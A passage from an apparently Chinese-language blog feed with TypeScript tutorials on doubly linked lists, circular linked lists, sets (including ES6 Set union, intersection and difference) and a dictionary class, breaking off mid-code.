<p>如果输入的索引超出链表长度，应该返回 <code>undefined</code>​。</p>
</li>
</ol>
<p>特别地，如果链表只有一个元素，那么删除唯一一个元素后，需要将 <code>head</code>​ 和 <code>tail</code>​ 指针都置为 <code>null</code>​。</p>
<h2 id="代码实现-2">代码实现</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LinkNode</span>, <span class="title class_">LinkedList</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./单链表&quot;</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">doubleLinkNode</span> <span class="keyword">extends</span> <span class="title class_ inherited__">LinkNode</span> &#123;</span><br><span class="line">    <span class="attr">prev</span>: doubleLinkNode | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">next</span>: doubleLinkNode | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(element);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">prev</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">doubleLinkList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">LinkedList</span> &#123;</span><br><span class="line">    <span class="attr">head</span>: doubleLinkNode | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">tail</span>: doubleLinkNode | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tail</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">push</span>(<span class="attr">element</span>: <span class="built_in">any</span>): doubleLinkNode &#123;</span><br><span class="line">        <span class="keyword">const</span> node = <span class="keyword">new</span> <span class="title function_">doubleLinkNode</span>(element);</span><br><span class="line">        <span class="comment">// 如果链表内没有元素,</span></span><br><span class="line">        <span class="comment">// 直接添加</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">head</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">head</span> = node;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span> = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果链表内有元素</span></span><br><span class="line">            <span class="comment">// 当前的最后一个元素的next指向新元素,</span></span><br><span class="line">            <span class="comment">// 新元素的prev指向当前的元素</span></span><br><span class="line">            <span class="comment">// 改变tail的指向</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span>!.<span class="property">next</span> = node;</span><br><span class="line">            node.<span class="property">prev</span> = <span class="variable language_">this</span>.<span class="property">tail</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span> = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">insert</span>(<span class="params">element: <span class="built_in">any</span>, index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="comment">// 首先判断index是否符合条件</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> node = <span class="keyword">new</span> <span class="title function_">doubleLinkNode</span>(element);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有元素</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">head</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = node;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">tail</span> = node;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有元素想要插入最前</span></span><br><span class="line">                node.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span>.<span class="property">prev</span> = node;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index === <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果是在最后插入</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span>!.<span class="property">next</span> = node;</span><br><span class="line">            node.<span class="property">prev</span> = <span class="variable language_">this</span>.<span class="property">tail</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span> = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在内部插入</span></span><br><span class="line">            <span class="comment">// 前一个结点的next=新节点</span></span><br><span class="line">            <span class="comment">// 后一个节点的prev=新节点</span></span><br><span class="line">            <span class="comment">// 新节点的prev=前一个结点</span></span><br><span class="line">            <span class="comment">// 新节点的next=后一个节点</span></span><br><span class="line">            <span class="keyword">const</span> prevNode = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>) <span class="keyword">as</span> doubleLinkNode;</span><br><span class="line">            <span class="keyword">const</span> nextNode = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index) <span class="keyword">as</span> doubleLinkNode;</span><br><span class="line"></span><br><span class="line">            prevNode.<span class="property">next</span> = node;</span><br><span class="line">            nextNode.<span class="property">prev</span> = node;</span><br><span class="line">            node.<span class="property">prev</span> = prevNode;</span><br><span class="line">            node.<span class="property">next</span> = nextNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">removeAt</span>(<span class="params">index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="comment">//在双向链表中删除元素需要考虑以下边界条件：</span></span><br><span class="line">        <span class="comment">// 如果链表为空，不能进行删除操作。</span></span><br><span class="line">        <span class="comment">// 如果要删除的元素是头结点或者尾节点，则需要更新 head 或 tail 指针。</span></span><br><span class="line">        <span class="comment">// 如果要删除的元素不是头节点或尾节点，则需要更新其前驱节点的 next 指针和后继节点的 prev 指针。</span></span><br><span class="line">        <span class="comment">// 如果输入的索引超出链表长度，应该返回 undefined。</span></span><br><span class="line">        <span class="comment">// 特别地，如果链表只有一个元素，那么删除唯一一个元素后，需要将 head 和 tail 指针都置为 null。</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= <span class="variable language_">this</span>.<span class="property">count</span> || <span class="variable language_">this</span>.<span class="property">count</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">current</span>: doubleLinkNode | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">            current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = <span class="literal">null</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">tail</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = current?.<span class="property">next</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span>!.<span class="property">prev</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index === <span class="variable language_">this</span>.<span class="property">count</span> - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 删除最后的元素</span></span><br><span class="line">            current = <span class="variable language_">this</span>.<span class="property">tail</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span> = current?.<span class="property">prev</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">tail</span>!.<span class="property">next</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 删除中间的元素</span></span><br><span class="line">            <span class="keyword">const</span> prevNode = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>) <span class="keyword">as</span> doubleLinkNode;</span><br><span class="line">            current = prevNode.<span class="property">next</span>;</span><br><span class="line">            prevNode.<span class="property">next</span> = current?.<span class="property">next</span>;</span><br><span class="line">            current!.<span class="property">next</span>!.<span class="property">prev</span> = prevNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>--;</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h1>循环链表</h1>
<p>循环列表的最后一个结点的 next 指向 head 结点</p>
<h2 id="代码实现-3">代码实现</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LinkNode</span>, <span class="title class_">LinkedList</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./单链表&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">circularLinkedList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">LinkedList</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">push</span>(<span class="attr">element</span>: <span class="built_in">any</span>): <span class="title class_">LinkNode</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> newNode = <span class="keyword">new</span> <span class="title class_">LinkNode</span>(element);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果空表</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> current = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(<span class="variable language_">this</span>.<span class="property">count</span> - <span class="number">1</span>);</span><br><span class="line">            current!.<span class="property">next</span> = newNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        newNode.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">insertElement</span>(<span class="attr">element</span>: <span class="built_in">any</span>, <span class="attr">index</span>: <span class="built_in">number</span>): <span class="title class_">LinkNode</span> | <span class="literal">undefined</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> newNode = <span class="keyword">new</span> <span class="title class_">LinkNode</span>(element);</span><br><span class="line">        <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有元素</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line">                newNode.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newNode.<span class="property">next</span> = current;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将最后的元素重新指向头</span></span><br><span class="line">                current = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(<span class="variable language_">this</span>.<span class="property">count</span> - <span class="number">1</span>);</span><br><span class="line">                current!.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在中间插入</span></span><br><span class="line">            current = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>);</span><br><span class="line">            newNode.<span class="property">next</span> = current?.<span class="property">next</span>;</span><br><span class="line">            current!.<span class="property">next</span> = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">removeAt</span>(<span class="params">index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= <span class="variable language_">this</span>.<span class="property">count</span> || <span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果只有一个元素</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> last = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(<span class="variable language_">this</span>.<span class="property">count</span> - <span class="number">1</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = current?.<span class="property">next</span>;</span><br><span class="line">                last!.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            current = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>);</span><br><span class="line">            current!.<span class="property">next</span> = current?.<span class="property">next</span>?.<span class="property">next</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>--;</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>‍</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习-集合与字典</title>
    <url>/20230312/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E9%9B%86%E5%90%88%E4%B8%8E%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<h1>集合</h1>
<p>Set 是一种数据结构，用于存储唯一值的集合。它类似于数组，但不允许重复元素。</p>
<h2 id="代码实现">代码实现</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">mySet</span> &#123;</span><br><span class="line">    item = &#123;&#125; <span class="keyword">as</span> &#123;</span><br><span class="line">        [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">any</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">has</span>(element)) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">item</span>[element] = element;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">has</span>(element)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">item</span>[element];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">has</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> element <span class="keyword">in</span> <span class="variable language_">this</span>.<span class="property">item</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">item</span> = &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">this</span>.<span class="property">item</span>).<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">values</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="variable language_">this</span>.<span class="property">item</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ES6-的-Set-结构">ES6 的 Set 结构</h2>
<ol>
<li class="lvl-3">
<p>创建一个新的 Set 对象：可以通过以下任意一种方式创建一个 Set 对象：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>(); <span class="comment">// 空集合</span></span><br><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">// 包含了元素 1，2 和 3 的集合</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>添加元素到集合中：可以使用 add()方法向集合中添加元素：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">2</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>删除集合中的元素：可以使用 delete()方法删除集合中的元素：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">set.<span class="title function_">delete</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>检查集合中是否存在某个元素：可以使用 has()方法来检查集合中是否存在某个元素：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">set.<span class="title function_">has</span>(<span class="number">2</span>); <span class="comment">// 返回 true</span></span><br><span class="line">set.<span class="title function_">has</span>(<span class="number">4</span>); <span class="comment">// 返回 false</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>获取集合的大小：可以使用 size 属性获取集合中元素的数量：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">set.<span class="property">size</span>; <span class="comment">// 返回 3</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>迭代集合中的元素：可以使用 for…of 循环或者 forEach()方法来迭代 Set 中的所有元素：</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="利用-set-取并集-交集-差集">利用 set 取并集, 交集, 差集</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取交集并集差集</span></span><br><span class="line"><span class="keyword">const</span> setA = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> setB = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并集</span></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title class_">Set</span>([...setA, ...setB]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交集</span></span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Set</span>([...setA].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> setB.<span class="title function_">has</span>(item)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 差集</span></span><br><span class="line"><span class="comment">// 给定两个集合A和B，它们的差集是指包含所有属于集合A但不属于集合B的元素所构成的集合</span></span><br><span class="line"><span class="comment">// setA的差集</span></span><br><span class="line"><span class="keyword">const</span> e = <span class="keyword">new</span> <span class="title class_">Set</span>([...setA].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !setB.<span class="title function_">has</span>(item)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br></pre></td></tr></table></figure>
<h1>字典</h1>
<p>字典和集合很类似, 集合以(值, 值)的形式存储数据, 字典则以(键, 值)</p>
<p>的形式存储数据, 字典也成为映射, 符号表, 或关联数组</p>
<p>ES6 中的 <code>Set</code> 和 <code>Map</code> 都是集合（collection）类型，但它们有一些区别：</p>
<ol>
<li class="lvl-3">
<p><code>Set ​</code> 是一组有序且唯一的值的集合，而 <code>Map ​</code> 是一组键值对(key-value)的集合。</p>
</li>
<li class="lvl-3">
<p>在 <code>Set ​</code> 中，每个元素只出现一次，可以用来去重；在 <code>Map ​</code> 中，每个键(<code>key</code>)只能对应一个值(<code>value</code>)，但同一个值可以被多个键所对应。</p>
</li>
<li class="lvl-3">
<p><code>Set ​</code> 采用类似数组的方式来访问其成员，而 Map 则采用键来访问其成员。</p>
</li>
<li class="lvl-3">
<p><code>Set ​</code> 的主要方法包括 <code>add</code>、<code>delete</code>、<code>has</code>、<code>clear ​</code> 等，而 <code>Map ​</code> 的主要方法包括 <code>set</code>、<code>get</code>、<code>has</code>、<code>delete</code>、<code>clear ​</code> 等。</p>
</li>
</ol>
<p>因此，如果需要存储一组唯一的值或进行去重操作，可以使用 <code>Set</code>；如果需要存储键值对，并且需要通过键来访问其对应的值，则可以使用 <code>Map</code>。</p>
<h2 id="代码实现-2">代码实现</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dictionary</span> &#123;</span><br><span class="line">    table = &#123;&#125; <span class="keyword">as</span> &#123;</span><br><span class="line">        [<span class="attr">k</span>: <span class="built_in">string</span>]: <span class="built_in">any</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">toStr</span>(<span class="params">item: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item === <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (item === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;string&quot;</span> || item <span class="keyword">instanceof</span> <span class="title class_">String</span>)</span><br><span class="line">            <span class="keyword">return</span> item <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">key: <span class="built_in">any</span>, value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key !== <span class="literal">null</span> &amp;&amp; value !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">table</span>[<span class="variable language_">this</span>.<span class="title function_">toStr</span>(key)] = <span class="keyword">new</span> <span class="title function_">keyPair</span>(key, value);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params">key: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="variable language_">this</span>.<span class="property">table</span>[<span class="variable language_">this</span>.<span class="title function_">toStr</span>(key)]?.<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (value) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">hasKey</span>(<span class="params">key: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">table</span>[<span class="variable language_">this</span>.<span class="title function_">toStr</span>(key)] != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">keys</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">keyValues</span>().<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">values</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">keyValues</span>().<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">keyValues</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="variable language_">this</span>.<span class="property">table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">this</span>.<span class="property">table</span>).<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">size</span>() === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">table</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">foreach</span>(<span class="params">cb: <span class="built_in">Function</span></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> pair = <span class="variable 